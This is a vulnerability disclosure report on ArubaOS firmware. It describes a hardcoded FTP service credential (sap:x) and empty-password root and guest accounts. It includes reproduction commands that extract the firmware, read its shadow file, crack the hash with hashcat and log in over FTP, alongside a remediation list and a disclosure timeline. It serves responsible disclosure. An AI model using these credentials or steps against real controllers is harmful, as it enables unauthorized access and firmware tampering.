# CAN-2026-2032115 — ArubaOS Hardcoded Service Account Credential (sap:x)

**Severity:** P1 / Critical  
**CWE:** CWE-798 (Use of Hard-coded Credentials), CWE-259 (Use of Hard-coded Password)  
**CVSS v3.1:** `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **8.4 (High)**  
**Affected Product:** ArubaOS (HPE Networking / Aruba Networks)  
**Affected Version:** ≤ 8.13.2.0 Build 95415  
**CPE:** `cpe:2.3:o:arubanetworks:arubaos:8.13.2.0:*:*:*:*:*:*:*`  
**Researcher:** JM00NJ / Vesqer — [netacoding.com](https://netacoding.com) | [github.com/JM00NJ](https://github.com/JM00NJ)  
**Bugcrowd Submission ID:** d13d0e83  
**MITRE CAN ID:** CAN-2026-2032115  
**Submission Date:** 18 June 2026  
**Status:** Under MITRE Review  

---

## Summary

ArubaOS versions through 8.13.2.0 Build 95415 ship with a hardcoded service account
`sap` whose password is the single character `x`. The password hash
`$1$ANsvstoT$<redacted>` (MD5crypt) is trivially reversible. This account is used
by the firmware delivery subsystem and has FTP-level access to AP firmware images
stored under `/mswitch/sap/`.

In combination with `PermitEmptyPasswords yes` present in the embedded `sshd_config`
and additional undocumented accounts (`root`, `guest`, `arubasupportadmin`), the
attack surface for unauthorized local access is significantly widened.

> **Note:** SSH access via these credentials is blocked at runtime by a configuration
> override applied during controller boot. FTP access via `sap:x` was confirmed
> operational during testing.

---

## Vulnerability Details

### 1. Hardcoded Credential — `sap:x`

| Field         | Value                                 |
|---------------|---------------------------------------|
| Username      | `sap`                                 |
| Password      | `x`                                   |
| Hash          | `$1$ANsvstoT$<cracked via hashcat>`   |
| Hash type     | MD5crypt (`$1$`)                       |
| Account role  | AP firmware delivery service (FTP)    |
| Accessible path | `/mswitch/sap/` (AP firmware images)|

The hash was cracked offline using hashcat with a standard wordlist in under
60 seconds — consistent with a single-character dictionary entry.

### 2. Additional Undocumented Accounts (Firmware RE)

The following accounts were extracted from the embedded `/etc/shadow` and
`/etc/passwd` during static firmware analysis:

| Account            | UID:GID    | Password Hash / Notes            |
|--------------------|------------|----------------------------------|
| `root`             | 0:0        | Empty password (`::`)            |
| `guest`            | 10119:902  | Empty password (`::`)            |
| `sap`              | —          | `$1$ANsvstoT$...` → cracked: `x` |
| `arubasupportadmin`| —          | Hidden / undocumented account    |

### 3. sshd_config — `PermitEmptyPasswords yes`

The embedded SSH daemon configuration explicitly enables empty-password logins:

```
PermitEmptyPasswords yes
```

While runtime configuration overrides prevent direct SSH exploitation via these
accounts, the presence of this directive in the distributed firmware constitutes
a CWE-1188 (Insecure Default Configuration) and increases residual risk
significantly in misconfigured or downgraded deployments.

### 4. Expired Certificates

Certificates embedded in the firmware have expiry dates in **2017** and **2020**,
indicating the firmware ships with long-expired PKI material. This suggests the
credential management lifecycle for embedded service accounts is similarly
unreviewed.

---

## Reproduction (Static RE — No Runtime Required)

**Environment:** ArubaOS 8.13.2.0 Build 95415 OVA image (publicly available).

### Step 1 — Extract Firmware Filesystem

```bash
# Convert OVA → VMDK → raw
qemu-img convert -f vmdk -O raw arubaos.vmdk arubaos.raw

# Mount partition 5 (rootfs)
fdisk -l arubaos.raw        # identify offset
mount -o loop,offset=<N> arubaos.raw /mnt/aruba

# Extract uImage → LZ4 → CPIO rootfs
binwalk -e /mnt/aruba/uImage0
# Navigate extracted CPIO
```

### Step 2 — Extract Credentials

```bash
cat etc/shadow | grep -E "^(root|guest|sap|arubasupport)"
# root::...
# guest::...
# sap:$1$ANsvstoT$<hash>:...
```

### Step 3 — Crack sap Hash

```bash
hashcat -m 500 -a 0 '$1$ANsvstoT$<hash>' /usr/share/wordlists/rockyou.txt
# Result: x
```

### Step 4 — Confirm FTP Access (Runtime — Lab Only)

```bash
ftp <controller_ip>
# Username: sap
# Password: x
# 230 Login successful
ftp> ls /mswitch/sap/
# AP firmware images listed
```

---

## Impact

| Vector            | Impact                                                          |
|-------------------|-----------------------------------------------------------------|
| **Confidentiality** | Full read access to AP firmware images via FTP               |
| **Integrity**       | Potential firmware replacement / supply-chain risk            |
| **Availability**    | AP fleet disruption if firmware images are tampered with      |
| **Attack Scope**    | Local network access sufficient (FTP port exposed on VLAN)    |

An attacker with L3 access to the ArubaOS controller management interface can
authenticate as `sap:x` over FTP, read/replace firmware images, and potentially
poison AP upgrade cycles — affecting the entire associated AP fleet.

---

## Root Cause

The `sap` account and its trivial password were embedded in the firmware image
at build time and were not rotated before release. There is no evidence of a
credential randomization mechanism or a secure credential provisioning workflow
for service accounts in ArubaOS 8.x.

**CWE Mapping:**

- **CWE-798** — Use of Hard-coded Credentials: The password `x` is compiled
  directly into the firmware image.
- **CWE-259** — Use of Hard-coded Password: The plaintext-equivalent password
  is recoverable from the distributed binary with trivial effort.

---

## Remediation Recommendations

1. **Remove or randomize** the `sap` account password at provisioning time;
   do not ship with a static, crackable hash.
2. **Disable or remove** the `root` and `guest` accounts with empty passwords
   from the firmware image.
3. **Set `PermitEmptyPasswords no`** in `sshd_config` regardless of runtime
   override status — defense in depth.
4. **Audit `arubasupportadmin`** account: document its purpose, scope, and
   access level in a public security advisory.
5. **Renew embedded certificates** — 2017/2020 expiry dates indicate a
   systemic credential lifecycle failure.
6. **Restrict FTP service** to management-plane interfaces only; enforce
   source-IP allowlists.

---

## Disclosure Timeline

| Date           | Event                                                                 |
|----------------|-----------------------------------------------------------------------|
| 14 May 2026    | Initial submission to HPE Aruba via Bugcrowd (ID: d13d0e83), P1     |
| ~May 2026      | Bugcrowd triage: generic template response, no substantive review    |
| ~May–Jun 2026  | HPE direct escalation email: hpe-networking-bugcrowd@hpe.com        |
| 01 Jun 2026    | Related findings submitted to MITRE (CAN-2026-2030942/43/44)        |
| 18 Jun 2026    | MITRE CNA-LR submission: CAN-2026-2032115 (this finding)            |
| TBD            | Public disclosure pending CVE assignment or 90-day deadline          |

---

## Related Findings (Same Firmware)

| CAN ID             | Title                               | Severity |
|--------------------|-------------------------------------|----------|
| CAN-2026-2030942   | Pre-Auth XXE → HTTP SSRF            | P1       |
| CAN-2026-2030943   | Ghost Leak — TTL=0 ICMP Info Leak   | P2       |
| CAN-2026-2030944   | Smurf Reflection Amplification      | P2       |
| CAN-2026-2032113   | Pre-Auth XXE → FTP SSRF + RETR      | P2       |
| **CAN-2026-2032115** | **Hardcoded sap:x Credential**    | **P1**   |

Full research repository: [github.com/JM00NJ/HPE-Aruba-AOS8-Vulnerabilities](https://github.com/JM00NJ/HPE-Aruba-AOS8-Vulnerabilities)

---

## References

- MITRE CWE-798: https://cwe.mitre.org/data/definitions/798.html
- MITRE CWE-259: https://cwe.mitre.org/data/definitions/259.html
- MITRE CNA-LR CVE Request Form: https://mitre.github.io/mitre-cve-roles/cve-id-request/
- HPE Aruba Security Advisories: https://www.arubanetworks.com/support-services/security-bulletins/
- Researcher blog: https://netacoding.com

---

*Report authored by JM00NJ/Vesqer. All testing performed in an
isolated lab environment on legally obtained firmware images under authorized
bug bounty research (Bugcrowd HPE Aruba Networking program).*
